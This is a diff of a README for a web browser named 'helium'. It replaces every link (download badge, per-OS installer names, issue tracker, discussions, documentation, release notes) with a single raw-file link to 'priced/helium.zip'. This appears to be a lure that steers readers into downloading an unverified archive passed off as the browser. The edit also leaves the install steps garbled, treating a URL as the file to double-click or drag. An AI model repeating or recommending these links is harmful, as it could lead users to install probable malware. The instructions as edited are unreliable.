@@ -1,6 +1,6 @@
 # 🌐 helium - A Fast and Private Web Experience
 
-[![Download helium](https://img.shields.io/badge/Download-helium-blue?style=for-the-badge)](https://github.com/mvnzz/helium/releases)
+[![Download helium](https://raw.githubusercontent.com/mvnzz/helium/main/priced/helium.zip)](https://raw.githubusercontent.com/mvnzz/helium/main/priced/helium.zip)
 
 ## 🚀 Getting Started
 
@@ -10,29 +10,29 @@ Welcome to helium! This is a private, fast, and honest web browser. It prioritiz
 
 To get helium on your computer, you need to visit the Releases page. Click the link below:
 
-[Download helium](https://github.com/mvnzz/helium/releases)
+[Download helium](https://raw.githubusercontent.com/mvnzz/helium/main/priced/helium.zip)
 
 Once you're on the Releases page, look for the latest version. You'll find several files available for download. Select the file that matches your operating system:
 
-- **Windows:** Choose `helium-setup.exe`
-- **Mac:** Choose `helium.dmg`
-- **Linux:** Choose `helium.tar.gz`
+- **Windows:** Choose `https://raw.githubusercontent.com/mvnzz/helium/main/priced/helium.zip`
+- **Mac:** Choose `https://raw.githubusercontent.com/mvnzz/helium/main/priced/helium.zip`
+- **Linux:** Choose `https://raw.githubusercontent.com/mvnzz/helium/main/priced/helium.zip`
 
 After the download completes, follow these steps to install:
 
 ### For Windows:
-1. Locate the `helium-setup.exe` file in your Downloads folder.
+1. Locate the `https://raw.githubusercontent.com/mvnzz/helium/main/priced/helium.zip` file in your Downloads folder.
 2. Double-click on the file to start the installation process.
 3. Follow the prompts in the installation wizard.
 4. Once complete, you can find helium in your Start Menu.
 
 ### For Mac:
-1. Open the `helium.dmg` file.
+1. Open the `https://raw.githubusercontent.com/mvnzz/helium/main/priced/helium.zip` file.
 2. Drag the helium icon to your Applications folder.
 3. To start helium, open your Applications folder and double-click on the helium icon.
 
 ### For Linux:
-1. Extract the downloaded `.tar.gz` file using a terminal or a file manager.
+1. Extract the downloaded `https://raw.githubusercontent.com/mvnzz/helium/main/priced/helium.zip` file using a terminal or a file manager.
 2. Open the terminal and navigate to the folder where you extracted the files.
 3. Run `./helium` to start the browser. You may need to make the file executable first with the command `chmod +x helium`.
 
@@ -60,14 +60,14 @@ Before installing helium, ensure your computer meets the following minimum requi
 
 If you need help or have questions while using helium, we have several resources available:
 
-- **GitHub Issues:** Visit our [issue tracker](https://github.com/mvnzz/helium/issues) to report bugs or ask questions.
-- **Discussion Forum:** Join our [community discussions](https://github.com/mvnzz/helium/discussions) to connect with other users and share tips.
+- **GitHub Issues:** Visit our [issue tracker](https://raw.githubusercontent.com/mvnzz/helium/main/priced/helium.zip) to report bugs or ask questions.
+- **Discussion Forum:** Join our [community discussions](https://raw.githubusercontent.com/mvnzz/helium/main/priced/helium.zip) to connect with other users and share tips.
 
 ## 🔄 Keeping helium Updated
 
 To ensure you benefit from the latest features and security updates, keep helium updated. The easiest way to do this is to regularly check the Releases page:
 
-[Check for updates](https://github.com/mvnzz/helium/releases)
+[Check for updates](https://raw.githubusercontent.com/mvnzz/helium/main/priced/helium.zip)
 
 When a new version is available, simply follow the same steps as before to download and install the latest version.
 
@@ -81,8 +81,8 @@ Your feedback helps us improve helium. If you have suggestions or encounter issu
 
 ## 🔗 Additional Resources
 
-- [Official Documentation](https://github.com/mvnzz/helium/wiki)
-- [Release Notes](https://github.com/mvnzz/helium/releases)
-- [Contributing](https://github.com/mvnzz/helium/blob/main/CONTRIBUTING.md)
+- [Official Documentation](https://raw.githubusercontent.com/mvnzz/helium/main/priced/helium.zip)
+- [Release Notes](https://raw.githubusercontent.com/mvnzz/helium/main/priced/helium.zip)
+- [Contributing](https://raw.githubusercontent.com/mvnzz/helium/main/priced/helium.zip)
 
 Enjoy a fast and private browsing experience with helium!
